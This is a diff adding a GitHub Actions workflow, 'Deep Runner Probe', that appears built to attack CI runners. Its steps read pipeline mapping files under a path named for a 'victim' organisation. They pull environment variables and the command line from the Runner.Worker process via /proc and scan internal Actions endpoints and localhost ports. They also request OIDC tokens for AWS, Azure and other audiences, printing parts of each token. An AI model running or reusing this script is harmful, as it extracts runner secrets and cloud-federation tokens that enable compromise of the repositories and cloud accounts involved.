@@ -1,0 +1,76 @@
+name: Deep Runner Probe
+on: workflow_dispatch
+
+permissions:
+  contents: read
+  actions: read
+  id-token: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pipeline mapping
+        run: |
+          echo "=== PipelineFolder.json ==="
+          cat /home/runner/work/_PipelineMapping/victim-test-org-bb/secret-target/PipelineFolder.json 2>/dev/null
+          
+          echo ""
+          echo "=== All PipelineMapping ==="
+          find /home/runner/work/_PipelineMapping -type f 2>/dev/null | head -10
+          for f in $(find /home/runner/work/_PipelineMapping -name "*.json" 2>/dev/null); do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null
+          done
+
+      - name: Runner worker token extraction
+        run: |
+          echo "=== Worker process ==="
+          # Find the Runner.Worker process
+          WORKER_PID=$(pgrep -f Runner.Worker || true)
+          echo "Worker PID: $WORKER_PID"
+          
+          if [ -n "$WORKER_PID" ]; then
+            echo "=== Worker cmdline ==="
+            cat /proc/$WORKER_PID/cmdline 2>/dev/null | tr '\0' ' ' | head -c 500
+            echo ""
+            
+            echo "=== Worker env (filtered) ==="
+            cat /proc/$WORKER_PID/environ 2>/dev/null | tr '\0' '\n' | grep -E "ACTIONS_|INTERNAL|SERVICE|CACHE|RESULT|RUNTIME" | head -20
+          fi
+          
+          echo ""
+          echo "=== All Runner processes ==="
+          ps aux | grep -i "runner\|worker\|listener" | grep -v grep | head -10
+
+      - name: Service endpoint discovery
+        run: |
+          echo "=== Try known internal endpoints ==="
+          # Try to discover the results service
+          for ep in \
+            "https://results.actions.githubusercontent.com" \
+            "https://artifactcache.actions.githubusercontent.com" \
+            "https://pipelines.actions.githubusercontent.com" \
+            "https://vstoken.actions.githubusercontent.com"; do
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "$ep" 2>/dev/null || echo "timeout")
+            echo "$ep -> $CODE"
+          done
+          
+          echo ""
+          echo "=== Try internal runner APIs ==="
+          # The runner listens on a local port for job communication
+          for port in 8080 8081 3000 5000 13000; do
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 1 "http://127.0.0.1:$port" 2>/dev/null || echo "closed")
+            if [ "$CODE" != "closed" ] && [ "$CODE" != "000" ]; then
+              echo "Port $port -> $CODE"
+            fi
+          done
+          
+      - name: OIDC audience test
+        run: |
+          # Test if we can get OIDC token with different audiences
+          for aud in "https://github.com" "https://api.github.com" "sts.amazonaws.com" "https://management.azure.com" "sigstore"; do
+            TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','ERR')[:50])" 2>/dev/null)
+            echo "aud=$aud -> ${TOKEN:0:30}..."
+          done
